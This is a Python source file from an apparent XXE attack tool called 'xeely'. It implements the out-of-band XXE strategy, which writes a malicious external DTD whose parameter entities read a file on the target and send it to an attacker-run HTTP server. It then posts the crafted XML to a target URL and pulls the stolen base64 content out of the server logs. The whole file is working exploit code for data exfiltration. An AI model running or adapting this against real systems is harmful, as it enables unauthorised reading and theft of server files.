import os
from typing import Optional
from typing import Sequence

from xeely import RESOURCES_PATH
from xeely.custom_http import HTTPClient
from xeely.custom_http.server import HTTPServerParams
from xeely.custom_http.server import LogsManager
from xeely.custom_http.server import run_http_server
from xeely.custom_xml import XML
from xeely.custom_xml import XMLDoctype
from xeely.custom_xml import XMLEntity
from xeely.xxe.attacks.base import BaseXXEAttack
from xeely.xxe.attacks.factory import factory
from xeely.xxe.doctype import write_doctype_content_to_disk
from xeely.xxe.errors import InvalidOptionException
from xeely.xxe.errors import ReverseConnectionParamsNotSpecified
from xeely.xxe.strategy import XXEAttackStrategy

OOB_DTD_FILE_PATH = RESOURCES_PATH / "oob.dtd"
EXPLOIT_ENTITY_NAME = "content"


def create_oob_dtd_file(resource: str, http_server_params: HTTPServerParams):
    file_entity_name = "file"

    entities = [
        XMLEntity(_name=file_entity_name, _value=resource, _is_parameter=True, _is_external=True),
        XMLEntity(
            _name="oob",
            _value=XMLEntity(
                _name=EXPLOIT_ENTITY_NAME,
                _value=f"{http_server_params.get_base_url()}/?content=%{file_entity_name};",
                _is_external=True,
            )
            .to_xml()
            .replace('"', "'"),
            _is_parameter=True,
        ),
    ]

    write_doctype_content_to_disk(OOB_DTD_FILE_PATH, entities)


def delete_oob_dtd_file():
    os.remove(OOB_DTD_FILE_PATH)


@factory.register(name=XXEAttackStrategy.OOB.value)
class OOBAttack(BaseXXEAttack):
    def __init__(
        self,
        target_url: str,
        xml: XML,
        encode_data_with_base64: bool,
        use_cdata_tag: bool,
        http_server_params: Optional[HTTPServerParams],
    ):
        super().__init__(
            target_url, xml, encode_data_with_base64, use_cdata_tag, http_server_params
        )

    def _check_params(self):
        if self.get_http_server_params() is None:
            raise ReverseConnectionParamsNotSpecified()
        if not self.get_encode_data_with_base64():
            raise InvalidOptionException("phpfilter")
        if self.get_use_cdata_tag():
            raise InvalidOptionException("cdata")

    def _configure_xml_for_attack(self, resource: str):
        http_server_params = self.get_http_server_params()
        if http_server_params is None:
            raise ReverseConnectionParamsNotSpecified()

        entities: Sequence[XMLEntity | str] = [
            XMLEntity(
                _name="remote",
                _value=f"{http_server_params.get_base_url()}/{OOB_DTD_FILE_PATH.name}",
                _is_external=True,
                _is_parameter=True,
            ),
            "%remote;",
            "%oob;",
        ]

        xml = self.get_xml()
        doctype = XMLDoctype(xml.get_root_node_name(), entities)

        # Replacing the value of a text element
        text_elements = xml.get_text_elements()

        if len(text_elements) == 0:
            raise Exception("Cannot perform the attack no text element found!")
        text_element = text_elements[0]

        xml.change_text_element_value(text_element.get_name(), f"&{EXPLOIT_ENTITY_NAME};")

        xml.set_doctype(doctype)

    def _run_attack(self) -> str:
        http_server_params = self.get_http_server_params()
        if http_server_params is None:
            raise ReverseConnectionParamsNotSpecified()

        with run_http_server(
            lhost=http_server_params.get_host(), lport=http_server_params.get_port()
        ):
            create_oob_dtd_file(resource=self.get_resource(), http_server_params=http_server_params)
            HTTPClient.send_post_request(self.get_target_url(), self.get_xml().to_xml())
            delete_oob_dtd_file()

            # Getting latest logs
            latest_log = LogsManager.get_instance().get_latest_log()

            if latest_log is None:
                raise Exception("Could not retrieve the log containing base64 content!")

            return latest_log.split("content=")[1].split(" ")[0]
